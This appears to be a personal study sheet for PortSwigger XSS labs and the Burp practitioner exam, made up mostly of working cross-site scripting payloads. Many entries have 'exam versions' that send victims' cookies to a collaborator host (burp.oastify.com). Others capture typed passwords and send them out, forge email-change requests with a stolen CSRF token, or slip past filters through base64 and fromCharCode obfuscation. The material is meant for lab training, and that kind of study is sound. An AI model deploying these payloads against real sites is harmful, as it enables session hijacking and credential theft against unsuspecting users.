


### Notes

- When encountering blocked requests try to figure out what is blocking it we can basically send intercept a request by the proxy intercpet and intercept its response editing some data to make our payload work 
- run a  %{abcdef123456789} bruteforce the blocked param to see if there is some chars removed by the server 


**CSP Evaluator tool** to check if content security policy is in place to mitigate XSS attacks  [CSP Evaluator](https://csp-evaluator.withgoogle.com/)

if the `base-uri` is **missing in CSP** , this vulnerability will allow attacker to use the alternative exploit method described at [Upgrade stored self-XSS](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study?tab=readme-ov-file#upgrade-stored-self-xss).

When input field maximum length is at only 23 character in length then use this resource for **Tiny XSS Payloads**.

- [Tiny XSS Payloads](https://github.com/terjanq/Tiny-XSS-Payloads)

consider **Cookie stealer**  payloads
- [cookie stealer payloads](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/5cbfeb2a11577ad62a31f72635a000bf5dcce293/payloads/CookieStealer-Payloads.md).


# Payload Explained 

- "-alert(1)-" -> works  because js basically lets you do this "foo" - 3 so injecting something like "foo" - alert() -  3 will take this as executable function and executes the alert() 


- when you notice  there is a  **protocol error** it means that the website is thinking that the payload is split into 2 meaning `<svg onbegin>`  it thinks its 2 playload so what can we do is **URL ENCODE** the **SPACE**  or all of it 

- **discover** the tag and even by copy past  them in the intruder  from the portswigger website 

 
-  _**identify**_  XSS Payloads 
```html
<img src=1 onerror=alert(1)>


"><svg><animatetransform onbegin=alert(1)>


<>\'\"<script>{{7*7}}$(alert(1)}"-prompt(69)-"fuzzer
```


-  URL and Base64 online encoders and decoders <body%20§§=1>`

-  Host **iframe** code on exploit server and deliver exploit link to victim.

```html
<iframe src="https://TARGET.net/?search=%22%3E%3Cbody%20onpopstate=print()%3E">  
```


```HTML
<iframe src="https://TARGET.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin%3Ddocument.location%3D%27https%3A%2F%2FOASTIFY.COM%2F%3Fcookies%3D%27%2Bdocument.cookie%3B%3E">
</iframe>
```


# LABS

### Lab: Stored XSS into HTML context with nothing encoded

> submit post in the comment

```
<script>alert("1");</script>
```


### Lab: DOM XSS in `document.write` sink using source `location.search`


>in the search break out form the img source 


```
"><script>alert("1");</script>
```

> exam version

```
"></select><script>document.location='http://burp.oastify.com/?c='+document.cookie</script>
```
### Lab: DOM XSS in `innerHTML` sink using source `location.search`

```
<img src=x onerror=alert("1")>

```


### Lab: DOM XSS in jQuery anchor `href` attribute sink using `location.search` source


?returnPath=javascript:alert(document.domain)


### Lab: DOM XSS in jQuery selector sink using a hashchange event


add this to the body in the exploitable server `<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>` 
then  deliver to the victim


### Lab: Reflected XSS into attribute with angle brackets HTML-encoded

`" autofocus onfocus=alert(document.domain) x="`

since sometime these < >  are blocked



### Lab: Stored XSS into anchor `href` attribute with double quotes HTML-encoded


javascript:alert(document.domain)

insert this into the website since it is being called by` <a href> `



###  Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded


```js
';alert("1")//';
```
overall the script                    
```js
var searchTerms = '';alert("1")//';
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
```

###  Lab: Exploiting cross-site scripting to steal cookies 

``` js

<script> 
fetch("https:// burp collabrator ?cookie="+document.cookie);
</script>

```

> Other version

```js
<script>
document.write('<img src="http://burp.oastify.com?c='+document.cookie+'" />');
</script>
```

###  Exploiting cross-site scripting to capture passwords
``` js

<input name=username id=username>
<input type=password name=password onchange="
if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{ 

method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value 

});
">


```

### DOM XSS in `document.write` sink using source `location.search` inside a select element

```
&storeId=</select><img src="something" onerror=alert(1)>

```

> URL encode it 
### DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
> payload of all things exploit
```
{{constructor.constructor('alert(1)')()}}
```

> Exam version
```
{{constructor.constructor('document.location="http://burp.oastify.com?c="+document.cookie')()}}
```
### Reflected DOM XSS

```
\"+alert(1)}//
```


>Exam Version

```
\"-fetch('http://burp.oastify.com?c='+btoa(document.cookie))}//
```


### Stored DOM XSS

```js
<><img src=1 onerror=alert(1)>
```

> Exam version
```
<><img src=1 onerror="window.location='http://burp.oastify.com/c='+document.cookie">
```
### Exploiting XSS to perform CSRF


> CSRF protected use other user CSRF

> POC is done by the xmlhttp csrf burp feature

```js
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() 
{    
var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];    
var changeReq = new XMLHttpRequest();    
changeReq.open('post', '/my-account/change-email', true);    
changeReq.send('csrf='+token+'&email=test@test.com')};
</script>
```

###  Reflected XSS with some SVG markup allowed

 - first discover tag `<§§>`
 - then discover the event `<svg><animatetransform%20§§=1>`
 - URL encode 

```
https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E
```


### Reflected XSS into HTML context with most tags and attributes blocked


Bruteforce all tags , Find out, that payload gives 200 status. Use the next payload, to send it to victim:

```js
<script>

window.location.href="https://0a120004044565098156d034009700ef.web-security-academy.net/?search=%3Cbody+onresize%3Dprint%28%29%3E"

</script>
```

> Exam version 


```
<script>
location = 'https://TARGET.net/?search=<xss+id=x+onfocus=document.location='https://OASTIFY.COM/?c='+document.cookie tabindex=1>#x';
</script>
```

>ULR Encoded
```


<script>
location = 'https://kek.web-security-academy.net/?query=%3Cbody+onload%3Ddocument.location%3D%27https%3A%2F%2Fburp.oastify.com%2F%3Fc%3D%27%2Bdocument.cookie%20tabindex=1%3E#x';
</script>
```


### Reflected XSS into a JavaScript string with single quote and backslash escaped

```
</script><script>alert(1)</script>
```

> Exam version

```
</script><script>document.location="http://burp.oastify.com/?c="+document.cookie</script>
```

### Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped


```
\';alert(1);//
\'-alert(1)//
```

>Exam version

```
\';document.location=`http://burp.oastify.com/?c=`+document.cookie;//
```

###  Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped


```
http://foo?&apos;-alert(1)-&apos;
```

### Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped

```
${alert(1)}
```



## Some Useful Bypasses


> WAF bypass

```
</ScRiPt ><ScRiPt >document.write('<img src="http://burp.oastify.com?c='+document.cookie+'" />');</ScRiPt > 

Can be interpreted as

</ScRiPt ><ScRiPt >document.write(String.fromCharCode(60, 105, 109, 103, 32, 115, 114, 99, 61, 34, 104, 116, 116, 112, 58, 47, 47, 99, 51, 103, 102, 112, 53, 55, 56, 121, 56, 107, 51, 54, 109, 98, 102, 56, 112, 113, 120, 54, 113, 99, 50, 110, 116, 116, 107, 104, 97, 53, 122, 46, 111, 97, 115, 116, 105, 102, 121, 46, 99, 111, 109, 63, 99, 61) + document.cookie + String.fromCharCode(34, 32, 47, 62, 60, 47, 83, 99, 114, 105, 112, 116, 62));</ScRiPt >
```

```
"-alert(window["document"]["cookie"])-"
"-window["alert"](window["document"]["cookie"])-"
"-self["alert"](self["document"]["cookie"])-"
```

```
"+eval(atob("ZmV0Y2goImh0dHBzOi8vYnVycC5vYXN0aWZ5LmNvbS8/Yz0iK2J0b2EoZG9jdW1lbnRbJ2Nvb2tpZSddKSk="))}//
```

### Lab: DOM XSS in `document.write` sink using source `location.search` inside a select element

see that there is  a sink in the source code

```
var stores = ["London","Paris","Milan"]; var store = (new URLSearchParams(window.location.search)).get('storeId');

document.write('<select name="storeId">'); 
if(store) { 
document.write('<option selected>'+store+'</option>'); } 

for(var i=0;i<stores.length;i++) { if(stores[i] === store) { continue; } document.write('<option>'+stores[i]+'</option>'); } document.write('</select>');
```


then later in the code we see that its looping around the array stored and  inserting the stored[i]

>escape the options  and select 
```url
?productId=1&storeId=something</option></select><script>alert(1)</script>
```
# References

- https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
- https://www.christian-schneider.net/CsrfAndSameOriginXss.html
- [Cross-site scripting (XSS) cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [PayloadsAllTheThings (XSS)](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#xss-in-htmlapplications)
